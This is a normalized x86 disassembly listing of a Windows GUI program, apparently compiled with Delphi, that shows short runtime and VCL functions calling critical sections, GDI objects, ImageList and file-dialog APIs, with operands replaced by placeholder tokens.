mov eax [ ebp - 0x8 ]
call sub_403234
mov eax [ ebp - 0x4 ]
call sub_403234
retn
sub_418b8b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418bb0
lea eax [ ebp - 0x1c ]
call sub_4055a8
lea eax [ ebp - 0x18 ]
call sub_403f6c
retn
sub_418bb0
pop ebx
mov esp ebp
pop ebp
retn
sub_418dc9
pop ebx
mov esp ebp
pop ebp
retn
sub_418e1c
push ebx
mov ebx eax
mov edx [ ebx + 0x8 ]
mov ecx [ ebx + 0x10 ]
mov eax [ ebx + 0x4 ]
call sub_4156e4
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
sub_418e34
test dl dl
je r-xdata
mov dl 0x8
call sub_418fb8
retn
mov dl 0x9
call sub_418fb8
retn
sub_418ebc
mov dl 0x1
call sub_418fb8
retn
sub_418ec4
xor edx edx
call sub_418fb8
retn
sub_418fb0
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418fcc
push rw-data
call InitializeCriticalSection
push r-xdata
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
retn
call sub_40c69c
sub_419000
push rw-data
call DeleteCriticalSection
mov eax [ rw-data ]
push eax
call CloseHandle
retn
sub_419018
mov eax [ rw-data ]
push eax
call ResetEvent
retn
sub_419024
push ebx
mov ebx eax
push ebx
mov eax [ rw-data ]
push eax
call WaitForSingleObject
test eax eax
jne r-xdata
pop ebx
retn
call sub_419018
sub_41914a
jmp sub_4036bc
sub_4191b6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4191d5
push rw-data
call LeaveCriticalSection
retn
sub_4191d5
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4192a4
test [ eax + 0x1c ] 0x8
jne r-xdata
retn
call sub_419480
sub_419304
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4175c0
mov [ ebx + 0x18 ] ax
pop esi
pop ebx
retn
sub_419318
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_4175c0
mov [ ebx + 0x1a ] ax
pop esi
pop ebx
retn
sub_41932c
movzx eax [ eax + 0x18 ]
xchg edx eax
call sub_418e48
retn
sub_419338
movzx eax [ eax + 0x1a ]
xchg edx eax
call sub_418e48
retn
sub_4195e0
xor eax eax
retn
sub_4195e4
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_4195ec
xor eax eax
retn
sub_4195f0
retn
sub_4195f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_403fc0
pop esi
pop ebx
retn
sub_419608
mov eax [ eax + 0x4 ]
retn
sub_41960c
retn
sub_419610
xor eax eax
retn
sub_419614
retn
sub_419618
push ebx
mov ebx eax
or [ ebx + 0x1c ] 0x40
pop ebx
retn
sub_419624
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xffbf
pop ebx
retn
sub_419630
push ebx
mov ebx eax
and [ ebx + 0x1c ] 0xfffe
pop ebx
retn
sub_41963c
retn
sub_419640
xchg edx eax
call sub_417264
retn
sub_419648
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
retn
sub_4196d0
push esi
mov esi eax
mov eax edx
mov edx esi
mov si 0xfff4
call sub_403430
pop esi
retn
sub_4196e4
retn
sub_4197c4
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403fc0
pop esi
pop ebx
retn
sub_419804
mov edx [ eax + 0x10 ]
test edx edx
je r-xdata
xor eax eax
retn
mov eax [ edx + 0x8 ]
retn
sub_419950
push ebx
mov ebx eax
test dl dl
je r-xdata
and [ ebx + 0x24 ] 0xfb
pop ebx
retn
or [ ebx + 0x24 ] 0x4
pop ebx
retn
sub_419964
push ebx
cmp [ eax + 0x20 ] 0x0
je r-xdata
call sub_403464
pop ebx
retn
mov eax [ eax + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
pop ebx
retn
sub_41997c
push ebp
mov ebp esp
pop ebp
retn 0x4
sub_419a04
retn
sub_419a4c
retn
sub_419a84
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx [ eax + 0x10 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_419a9c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x10 ]
call sub_419cc0
mov eax [ ebx + 0x10 ]
mov si 0xffef
call sub_403430
pop esi
pop ebx
retn
sub_419ae4
mov al 0x1
retn
sub_419ae8
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_419af0
mov eax [ eax + 0x10 ]
mov edx [ eax ]
call [ edx + 0x44 ]
retn
sub_419b98
xor eax eax
retn
sub_419b9c
retn
sub_419bc8
retn
sub_419c60
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_419c74
mov [ edx + 0x10 ] eax
mov eax [ eax + 0x50 ]
call sub_4136e4
retn
sub_419dbb
jmp sub_4036bc
sub_419dc0
mov ebx 0x1
call sub_403a24
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419e23
jmp sub_4036bc
sub_419e28
mov ebx 0x80030103
call sub_403a24
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_419ea6
jmp sub_4036bc
sub_419eab
mov ebx 0x80030009
call sub_403a24
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
sub_419f09
jmp sub_4036bc
sub_419f0e
mov ebx 0x8000ffff
call sub_403a24
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a0ea
jmp sub_4036bc
sub_41a0ef
mov [ ebp - 0x4 ] 0x8000ffff
call sub_403a24
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a118
lea eax [ ebp + 0xc ]
call sub_4055a8
retn
sub_41a118
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub_41a124
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_41a130
push ebp
mov ebp esp
mov eax 0x80030102
pop ebp
retn 0x4
sub_41a13c
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a148
push ebp
mov ebp esp
mov eax 0x80030001
pop ebp
retn 0x18
sub_41a1b7
jmp sub_4036bc
sub_41a1bc
mov esi 0x8000ffff
call sub_403a24
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_41a1d0
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_41a244
mov eax [ rw-data ]
call sub_403234
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41a254
call sub_413030
retn
sub_41a31c
test eax eax
je r-xdata
retn
mov edx [ rw-data ]
mov [ eax + 0x5 ] edx
mov [ rw-data ] eax
sub_41a4c7
pop ebp
retn
sub_41a55c
pop ebp
retn
sub_41a7ec
pop ebp
retn
sub_41a7f0
sub [ rw-data ] 0x1
retn
sub_41af43
inc ecx
add [ eax ] ah

sub_41b058
in al dx
rol [ ecx ] 0x1
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add edx [ eax + 0x65 ]
outsb
mov eax eax
int3
sub_41b0e8
retn 0x41b0
sub_41b166
inc eax
add [ edx + ebp * 8 ] dh
inc ecx
add [ eax ] bh
0x2a680041 0x40
sub_41b174
dec eax
0xe7100041 0x41
sub_41b182
inc ecx
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add [ eax + 0x2a ] ch
inc eax
add [ ecx ] al
add ch bh
[ eax + 0x80041e9 ]
sub_41b4a8
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_41b51c
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_41b590
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41b59c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_41b683
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b7ac
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41b817
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b886
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41b930
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41bd88
push 0x33
mov ecx rw-data
call sub_4132f0
retn
sub_41bd98
push 0x33
mov ecx rw-data
call sub_4132b0
retn
sub_41bda8
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_41bdcc
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_41bfa0
push 0x11
mov ecx rw-data
call sub_4132b0
retn
sub_41c0e0
push ebx
mov ebx eax
mov eax ebx
call sub_41bda8
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_41c1a1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bdcc
retn
sub_41c1d0
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0xb
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_41c234
pop ebx
pop ecx
pop ebp
retn
sub_41c3dc
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_41c448
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x10 ]
add edx 0x1b
call sub_4041d0
pop esi
pop ebx
retn
sub_41c4bc
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_41c418
push eax
call MulDiv
neg eax
pop ebx
retn
sub_41c4f8
mov eax [ eax + 0x10 ]
mov dl [ eax + 0x19 ]
mov eax edx
retn
sub_41c530
mov eax [ eax + 0x10 ]
mov al [ eax + 0x18 ]
retn
sub_41c560
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1a ]
retn
sub_41c685
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bdcc
retn
sub_41c718
pop ebx
pop ecx
pop ebp
retn
sub_41c71c
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_41c7e4
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403430
sub_41c7f8
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41c828
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_41c93e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41bdcc
retn
sub_41c9d4
pop ebx
pop ecx
pop ebp
retn
sub_41cb18
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41ce58
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41d0ab
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41d0b4
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41d0ec
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41d0f8
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41d238
retn
sub_41d301
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41d318
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41d404
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d424
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d444
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d464
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
pop ebx
retn
sub_41d47c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b35c
call sub_4039a8
pop ebx
retn
sub_41d4a0
mov eax [ rw-data ]
call sub_41d47c
retn
sub_41d4fd
pop ecx
pop ebp
retn
sub_41d5a3
pop ebx
mov esp ebp
pop ebp
retn
sub_41d70d
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41d738
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_41d9d3
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41dbec
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41df23
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41df43
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41df43
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41e2a3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e2c6
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026dc
retn
sub_41e2c6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e2e6
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
sub_41e2e6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41e438
push 0x0
call sub_41e3d4
retn
sub_41e4e4
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41e4f0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_41e440
pop ebx
pop ebp
retn 0x4
sub_41e504
retn
sub_41e508
test eax eax
jne r-xdata
retn
call sub_41e504
sub_41e709
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41e748
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_41e915
mov eax [ ebp - 0xc ]
call sub_403234
retn
j_sub_41e915
jmp sub_41e915
sub_41e925
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403234
retn
sub_41e94c
xor eax eax
retn
sub_41e950
mov al [ eax + 0x21 ]
retn
sub_41e9a3
pop esi
pop ecx
pop ebp
retn
sub_41e9d0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_41ea2e
pop esi
pop ecx
pop ebp
retn
sub_41ea34
retn
sub_41ea38
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41ea48
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_41ea58
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_41eb95
mov esp ebp
pop ebp
retn
sub_41ee0c
inc [ eax + 0x4 ]
retn
sub_41f5b3
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41f5d5
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_41f5df
jmp sub_4036bc
sub_41fad7
jmp sub_4036bc
sub_41fb2c
mov [ eax + 0x31 ] 0x0
call sub_41e748
retn
sub_41fdef
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fe60
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_41ff14
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_41ff24
push ebx
mov ebx eax
mov eax ebx
call sub_4200dc
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_41ff38
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_41ff54
push ebx
mov ebx eax
mov eax ebx
call sub_42013c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_41ffb0
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_420323
jmp sub_4036bc
sub_42038a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_4207fe
jmp sub_4036bc
sub_4208b4
jmp sub_4036bc
sub_4208b9
mov eax [ ebp - 0x38 ]
call sub_403234
call sub_4039d0
call sub_403a24
sub_4208cb
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4208e8
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
sub_420a37
jmp sub_4036bc
sub_420d03
jmp sub_4036bc
sub_420d94
mov cl 0x1
call sub_420d9c
retn
sub_421051
add [ eax ] al
add [ ebx ] dh
leave
call sub_420d9c
retn
sub_4210d6
jmp sub_4036bc
sub_4210db
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_4039d0
call sub_403a24
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42112c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_421265
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_421294
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_4212a8
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_4213c1
jmp sub_4036bc
sub_421476
jmp sub_4036bc
sub_4214e0
jmp sub_4036bc
sub_421514
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_4214a0
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_42152c
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41d464
retn
mov [ eax + 0x30 ] edx
retn
sub_421544
retn
sub_421548
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41d464
retn
mov [ eax + 0x2c ] edx
retn
sub_421588
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41d464
pop ebp
retn 0x4
sub_42159c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41d464
pop ebp
retn 0x4
sub_42175c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_421768
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42181c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_421907
jmp sub_4036bc
sub_421aa8
pop ebp
retn
sub_421ba8
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_421be4
pop ebp
retn
sub_421be8
sub [ rw-data ] 0x1
retn
sub_421e30
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_413840
retn
sub_421e64
mov eax [ eax + 0x4 ]
call sub_4136e4
retn
sub_421e9c
pop ebp
retn
sub_421ea0
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ __import_lookup_table_12(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_Add
jmp [ __import_lookup_table_12(comctl32:ImageList_Add) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ __import_lookup_table_12(comctl32:ImageList_GetBkColor) ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ __import_lookup_table_12(comctl32:ImageList_DragEnter) ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_SetIconSize) ]
sub_421f90
pop ebp
retn
sub_421f94
sub [ rw-data ] 0x1
retn
sub_422062
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_422678
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_422084
mov [ rw-data ] sub_42219c
mov [ rw-data ] sub_42210c
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_4223a0
mov [ rw-data ] sub_422474
mov [ rw-data ] sub_422548
retn
sub_422710
pop ebp
retn
sub_422714
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_422678
sub_422750
pop ebp
retn
sub_422754
sub [ rw-data ] 0x1
retn
sub_4229e3
add eax 0xffffffd4
jmp sub_423510
sub_4229eb
add eax 0xffffffd4
jmp sub_42356c
sub_4229fd
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40567c
sub_422a07
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405690
sub_422a38
sub [ edx ] eax

sub_422b9d
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_422db4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422fd5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4230c8
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4232d8
lea eax [ ebp - 0x30 ]
call sub_403f6c
lea eax [ ebp - 0x20 ]
call sub_403f6c
retn
j_sub_4232d8
jmp sub_4232d8
sub_4232f0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4233f2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4234f6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423566
pop ebx
pop ecx
pop ebp
retn
sub_423608
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_423614
mov eax [ eax + 0x20 ]
retn
sub_42374a
pop ebp
retn
sub_42374c
sub [ rw-data ] 0x1
retn
sub_423780
pop ebp
retn
sub_423784
sub [ rw-data ] 0x1
retn
sub_4237c4
pop ebp
retn
sub_4237c8
sub [ rw-data ] 0x1
retn
sub_423adc
pop ebp
retn
sub_423ae0
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_42382c
sub_423bc0
retn
sub_423c34
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_423c40
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_423c4c
mov edx [ eax ]
call [ edx ]
retn
sub_423c54
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_423c88
pop ebp
retn
sub_423c8c
sub [ rw-data ] 0x1
retn
sub_423e52
pop ebp
retn
sub_42420e
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42462f
pop ebp
retn
sub_424634
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_423bc4
mov [ rw-data ] eax
sub_42467c
pop ebp
retn
sub_424680
sub [ rw-data ] 0x1
retn
sub_4246b4
pop ebp
retn
sub_4246b8
sub [ rw-data ] 0x1
retn
sub_4246ec
pop ebp
retn
sub_4246f0
sub [ rw-data ] 0x1
retn
sub_424724
pop ebp
retn
sub_424728
sub [ rw-data ] 0x1
retn
sub_42475c
pop ebp
retn
sub_424760
sub [ rw-data ] 0x1
retn
sub_424794
pop ebp
retn
sub_424798
sub [ rw-data ] 0x1
retn
sub_424800
pop ebp
retn
sub_424804
sub [ rw-data ] 0x1
retn
GetOpenFileNameA
jmp [ __import_lookup_table_13(comdlg32:GetOpenFileNameA) ]
GetSaveFileNameA
jmp [ __import_lookup_table_13(comdlg32:GetSaveFileNameA) ]
sub_424848
pop ebp
retn
sub_42484c
sub [ rw-data ] 0x1
retn
sub_424880
pop ebp
retn
sub_424884
sub [ rw-data ] 0x1
retn
sub_424d28
jmp r-xdata
sub_424d2a
0x14ffe9ff 0x4256
sub_42524e
jmp sub_4036bc
sub_425253
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_456e58
call sub_403a24
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_425270
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_425278
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403430
pop esi
retn
sub_425290
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403430
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4252a8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_425386
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425390
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4253a4
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_42563c
push ebx
cmp [ eax + 0x8a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
sub_42565c
push ebx
cmp [ eax + 0x92 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_42567c
push ebx
cmp [ eax + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
sub_4256d5
pop ecx
pop ebp
retn
sub_425a24
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_425b64
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_425c2a
pop ebx
mov esp ebp
pop ebp
retn
sub_425cd2
